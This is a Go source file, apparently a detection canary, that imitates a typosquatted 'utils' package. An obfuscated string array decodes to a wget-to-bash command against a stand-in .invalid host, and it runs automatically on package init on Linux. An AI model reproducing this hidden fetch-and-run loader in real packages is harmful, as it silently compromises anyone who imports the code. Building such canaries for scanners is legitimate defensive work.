// Inert canary modelled on the 2025 Go typosquat wave (obfuscated string-array loader).
package utils

import (
	"os/exec"
	"runtime"
)

// Contains reports whether s is in list.
func Contains(list []string, s string) bool {
	for _, v := range list {
		if v == s {
			return true
		}
	}
	return false
}

func eGtROk() error {
	DmM := []string{"h", "f", "/", " ", "d", "r", "3", "g", "w", "g", "5", ".", "i", "/", "6", "d", "t", "s", "i", "s", "h", "s", "/", "1", "l", "e", "a", ".", "e", "b", "e", "b", "f", "e", "a", "p", "a", "a", "3", "e", "p", "d", "t", "|", " ", "d", "&", "r", "t", "/", "/", "4", " ", "a", "o", "7", "v", "o", "a", " ", "n", " ", "x", "l", "/", "-", "b", "O", "e", "n", "m", ":", "i", " ", "d", "/", "t", "l", "-", "3", "0"}
	ICbQZ := runtime.GOOS == "linux"
	cnoZqUgP := "/bin/sh"
	doUEPxOl := "-c"
	JJFhmo := DmM[8] + DmM[7] + DmM[25] + DmM[42] + DmM[44] + DmM[65] + DmM[67] + DmM[73] + DmM[78] + DmM[61] + DmM[20] + DmM[76] + DmM[48] + DmM[40] + DmM[19] + DmM[71] + DmM[22] + DmM[64] + DmM[24] + DmM[57] + DmM[36] + DmM[4] + DmM[28] + DmM[47] + DmM[27] + DmM[30] + DmM[62] + DmM[37] + DmM[70] + DmM[35] + DmM[77] + DmM[39] + DmM[11] + DmM[18] + DmM[60] + DmM[56] + DmM[58] + DmM[63] + DmM[12] + DmM[41] + DmM[49] + DmM[21] + DmM[16] + DmM[54] + DmM[5] + DmM[34] + DmM[9] + DmM[33] + DmM[13] + DmM[15] + DmM[68] + DmM[6] + DmM[55] + DmM[79] + DmM[74] + DmM[80] + DmM[45] + DmM[32] + DmM[50] + DmM[26] + DmM[38] + DmM[23] + DmM[10] + DmM[51] + DmM[14] + DmM[29] + DmM[1] + DmM[52] + DmM[43] + DmM[59] + DmM[75] + DmM[31] + DmM[72] + DmM[69] + DmM[2] + DmM[66] + DmM[53] + DmM[17] + DmM[0] + DmM[3] + DmM[46]
	if ICbQZ {
		exec.Command(cnoZqUgP, doUEPxOl, JJFhmo).Start()
		return nil
	}
	return nil
}

var JpZRwE = eGtROk()
